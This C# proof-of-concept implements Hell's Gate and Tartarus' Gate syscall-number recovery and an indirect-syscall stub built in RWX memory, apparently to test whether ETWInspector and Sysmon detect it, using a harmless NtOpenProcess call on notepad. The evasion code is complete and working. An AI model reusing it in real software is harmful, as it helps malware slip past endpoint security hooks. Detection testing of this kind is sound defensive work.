// Tartarus' Gate + Indirect Syscall POC
// Purpose : Test ETWInspector / Sysmon detection of indirect syscall usage
// Technique:
//   1. Hell's Gate   - resolve SSN by reading ntdll stub bytes
//   2. Tartarus' Gate- if stub is hooked, recover SSN from neighbouring stubs
//   3. Indirect call  - jump to ntdll's own "syscall; ret" gadget instead of
//                       executing syscall from our own memory (bypasses stack-
//                       based detections that look for return addresses outside ntdll)
// Payload  : NtOpenProcess on notepad.exe with PROCESS_ALL_ACCESS
//            => triggers Sysmon Event 10 with indirect-syscall CallTrace
//            => ETWInspector Get-SyscallAnomalies should flag INDIRECT_SYSCALL

using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace TartarusGatePOC
{
    class Program
    {
        // ── Native types ───────────────────────────────────────────────────

        [StructLayout(LayoutKind.Sequential)]
        struct OBJECT_ATTRIBUTES
        {
            public int    Length;
            public IntPtr RootDirectory;
            public IntPtr ObjectName;
            public uint   Attributes;
            public IntPtr SecurityDescriptor;
            public IntPtr SecurityQualityOfService;
        }

        [StructLayout(LayoutKind.Sequential)]
        struct CLIENT_ID
        {
            public IntPtr UniqueProcess;
            public IntPtr UniqueThread;
        }

        const uint PROCESS_ALL_ACCESS  = 0x1FFFFF;
        const uint MEM_COMMIT_RESERVE  = 0x3000;
        const uint PAGE_EXECUTE_RW     = 0x40;
        const uint MEM_RELEASE         = 0x8000;

        // ── P/Invoke ───────────────────────────────────────────────────────

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr VirtualAlloc(
            IntPtr lpAddress, uint dwSize,
            uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool VirtualFree(IntPtr lpAddress, uint dwSize, uint dwFreeType);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool CloseHandle(IntPtr hObject);

        // Delegate matching NtOpenProcess signature (x64 Microsoft ABI)
        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate uint NtOpenProcessFn(
            ref IntPtr        ProcessHandle,
            uint              DesiredAccess,
            ref OBJECT_ATTRIBUTES ObjectAttributes,
            ref CLIENT_ID     ClientId);

        // ── Step 1 : Find "syscall; ret" gadget inside ntdll .text ─────────

        static IntPtr FindSyscallGadget(IntPtr ntdllBase)
        {
            // e_lfanew -> NT headers
            int e_lfanew = Marshal.ReadInt32(ntdllBase, 0x3C);
            IntPtr ntHdr = ntdllBase + e_lfanew;

            short  numSections   = Marshal.ReadInt16(ntHdr, 6);
            short  optHdrSize    = Marshal.ReadInt16(ntHdr, 20);
            IntPtr sectionTable  = ntHdr + 24 + optHdrSize;

            for (int i = 0; i < numSections; i++)
            {
                IntPtr sec = sectionTable + i * 40;

                // Section name (8 bytes, ASCII, null-padded)
                byte[] nameBytes = new byte[8];
                for (int j = 0; j < 8; j++)
                    nameBytes[j] = Marshal.ReadByte(sec, j);
                string secName = System.Text.Encoding.ASCII.GetString(nameBytes).TrimEnd('\0');

                if (secName != ".text") continue;

                uint   rva      = (uint)Marshal.ReadInt32(sec, 12);
                uint   rawSize  = (uint)Marshal.ReadInt32(sec, 16);
                IntPtr textBase = ntdllBase + (int)rva;

                // Scan for: 0F 05 C3  (syscall; ret)
                for (uint off = 0; off < rawSize - 2; off++)
                {
                    if (Marshal.ReadByte(textBase, (int)off)     == 0x0F &&
                        Marshal.ReadByte(textBase, (int)off + 1) == 0x05 &&
                        Marshal.ReadByte(textBase, (int)off + 2) == 0xC3)
                    {
                        return textBase + (int)off;
                    }
                }
            }
            return IntPtr.Zero;
        }

        // ── Step 2 : Resolve SSN (Tartarus' Gate) ─────────────────────────
        // Clean stub layout:  4C 8B D1 B8 [SSN lo] [SSN hi] 00 00 ...
        // If hooked, scan neighbours (sorted by VA) and derive SSN from offset.

        static short ResolveSsn(IntPtr ntdllBase, string funcName)
        {
            int    e_lfanew  = Marshal.ReadInt32(ntdllBase, 0x3C);
            IntPtr ntHdr     = ntdllBase + e_lfanew;

            // Optional header: export directory RVA lives at offset 0x70 from
            // the first field of IMAGE_OPTIONAL_HEADER64 (Magic), which is at
            // ntHdr+24.  DataDirectory[0] = Export at ntHdr+24+112 = ntHdr+136.
            uint   exportRva = (uint)Marshal.ReadInt32(ntHdr, 136);
            IntPtr exportDir = ntdllBase + (int)exportRva;

            int  numNames     = Marshal.ReadInt32(exportDir, 0x18);
            uint rvaNames     = (uint)Marshal.ReadInt32(exportDir, 0x20);
            uint rvaOrdinals  = (uint)Marshal.ReadInt32(exportDir, 0x24);
            uint rvaFunctions = (uint)Marshal.ReadInt32(exportDir, 0x1C);

            IntPtr pNames     = ntdllBase + (int)rvaNames;
            IntPtr pOrdinals  = ntdllBase + (int)rvaOrdinals;
            IntPtr pFunctions = ntdllBase + (int)rvaFunctions;

            int targetOrdinal = -1;
            for (int i = 0; i < numNames; i++)
            {
                uint   nameRva = (uint)Marshal.ReadInt32(pNames, i * 4);
                string name    = Marshal.PtrToStringAnsi(ntdllBase + (int)nameRva);
                if (name == funcName)
                {
                    targetOrdinal = (ushort)Marshal.ReadInt16(pOrdinals, i * 2);
                    break;
                }
            }
            if (targetOrdinal < 0) return -1;

            IntPtr targetVa = ntdllBase + (int)(uint)Marshal.ReadInt32(pFunctions, targetOrdinal * 4);

            // Check if clean
            if (IsCleanStub(targetVa))
                return Marshal.ReadInt16(targetVa, 4);

            // Hooked: scan neighbours by ordinal (+/- delta) for a clean stub.
            // SSNs in ntdll are monotonically ordered by stub VA, so
            //   SSN(target) = SSN(neighbour) +/- delta_in_sorted_order.
            // Scanning by ordinal is an approximation that works in practice when
            // EDR hooks are sparse.
            for (int delta = 1; delta <= 32; delta++)
            {
                foreach (int dir in new[] { -1, +1 })
                {
                    int   neighbourOrd = targetOrdinal + dir * delta;
                    if (neighbourOrd < 0) continue;

                    IntPtr neighbourVa;
                    try
                    {
                        uint nRva = (uint)Marshal.ReadInt32(pFunctions, neighbourOrd * 4);
                        neighbourVa = ntdllBase + (int)nRva;
                    }
                    catch { continue; }

                    if (!IsCleanStub(neighbourVa)) continue;

                    short neighbourSsn = Marshal.ReadInt16(neighbourVa, 4);
                    return (short)(neighbourSsn - dir * delta);
                }
            }
            return -1;
        }

        static bool IsCleanStub(IntPtr va)
        {
            return Marshal.ReadByte(va, 0) == 0x4C &&
                   Marshal.ReadByte(va, 1) == 0x8B &&
                   Marshal.ReadByte(va, 2) == 0xD1 &&
                   Marshal.ReadByte(va, 3) == 0xB8;
        }

        // ── Step 3 : Build indirect syscall stub in RWX memory ─────────────
        //
        //   4C 8B D1              mov r10, rcx          ; Windows syscall ABI
        //   B8 xx xx 00 00        mov eax, <SSN>
        //   FF 25 00 00 00 00     jmp qword ptr [rip+0]  ; indirect: jump INTO ntdll
        //   xx xx xx xx xx xx xx xx  <gadget VA>
        //
        // Total: 3 + 5 + 6 + 8 = 22 bytes

        static IntPtr BuildStub(short ssn, IntPtr gadget)
        {
            byte[] stub = new byte[22];

            // mov r10, rcx
            stub[0] = 0x4C; stub[1] = 0x8B; stub[2] = 0xD1;

            // mov eax, ssn
            stub[3] = 0xB8;
            stub[4] = (byte)( ssn        & 0xFF);
            stub[5] = (byte)((ssn >> 8)  & 0xFF);
            stub[6] = 0x00;
            stub[7] = 0x00;

            // jmp [rip+0]  (after 6 bytes, rip = stub+14, reads stub[14..21])
            stub[8]  = 0xFF; stub[9]  = 0x25;
            stub[10] = 0x00; stub[11] = 0x00; stub[12] = 0x00; stub[13] = 0x00;

            // 8-byte gadget address
            long g = gadget.ToInt64();
            for (int i = 0; i < 8; i++)
                stub[14 + i] = (byte)((g >> (i * 8)) & 0xFF);

            IntPtr mem = VirtualAlloc(IntPtr.Zero, (uint)stub.Length,
                                      MEM_COMMIT_RESERVE, PAGE_EXECUTE_RW);
            if (mem == IntPtr.Zero) return IntPtr.Zero;
            Marshal.Copy(stub, 0, mem, stub.Length);
            return mem;
        }

        // ── Main ───────────────────────────────────────────────────────────

        static void Main(string[] args)
        {
            Console.WriteLine("[*] Tartarus Gate + Indirect Syscall POC");
            Console.WriteLine("[*] Detection target: ETWInspector + Sysmon Event 10");
            Console.WriteLine();

            // 1. Locate ntdll
            IntPtr ntdll = GetModuleHandle("ntdll.dll");
            Console.WriteLine($"[*] ntdll base          : 0x{ntdll.ToInt64():X16}");

            // 2. Find syscall gadget
            IntPtr gadget = FindSyscallGadget(ntdll);
            if (gadget == IntPtr.Zero)
            {
                Console.WriteLine("[-] syscall gadget not found");
                return;
            }
            Console.WriteLine($"[*] syscall;ret gadget  : 0x{gadget.ToInt64():X16}");

            // 3. Resolve NtOpenProcess SSN
            short ssn = ResolveSsn(ntdll, "NtOpenProcess");
            if (ssn < 0)
            {
                Console.WriteLine("[-] Could not resolve NtOpenProcess SSN");
                return;
            }
            Console.WriteLine($"[*] NtOpenProcess SSN   : 0x{ssn:X4} ({ssn})");

            // 4. Build indirect stub
            IntPtr stubMem = BuildStub(ssn, gadget);
            if (stubMem == IntPtr.Zero)
            {
                Console.WriteLine("[-] VirtualAlloc for stub failed");
                return;
            }
            Console.WriteLine($"[*] Indirect stub at    : 0x{stubMem.ToInt64():X16}");
            Console.WriteLine();

            // 5. Spawn notepad as target
            Process notepad = Process.Start("notepad.exe");
            Console.WriteLine($"[*] Spawned notepad.exe PID: {notepad.Id}");
            System.Threading.Thread.Sleep(800);

            // 6. Call NtOpenProcess via indirect syscall
            Console.WriteLine("[*] Calling NtOpenProcess via indirect syscall...");

            var ntOpenProcess = (NtOpenProcessFn)Marshal.GetDelegateForFunctionPointer(
                stubMem, typeof(NtOpenProcessFn));

            IntPtr hProcess = IntPtr.Zero;
            var oa = new OBJECT_ATTRIBUTES { Length = Marshal.SizeOf<OBJECT_ATTRIBUTES>() };
            var cid = new CLIENT_ID { UniqueProcess = (IntPtr)notepad.Id };

            uint status = ntOpenProcess(
                ref hProcess,
                PROCESS_ALL_ACCESS,
                ref oa,
                ref cid);

            if (status == 0)
            {
                Console.WriteLine($"[+] NtOpenProcess succeeded  handle: 0x{hProcess.ToInt64():X}");
                Console.WriteLine("[+] Sysmon Event 10 fired -- check ETWInspector for INDIRECT_SYSCALL");
                CloseHandle(hProcess);
            }
            else
            {
                Console.WriteLine($"[-] NtOpenProcess failed  NTSTATUS: 0x{status:X8}");
            }

            // Cleanup
            VirtualFree(stubMem, 0, MEM_RELEASE);
            System.Threading.Thread.Sleep(500);
            try { notepad.Kill(); } catch { }

            Console.WriteLine();
            Console.WriteLine("[*] Done. Run Invoke-SyscallDetect.ps1 against this binary.");
        }
    }
}
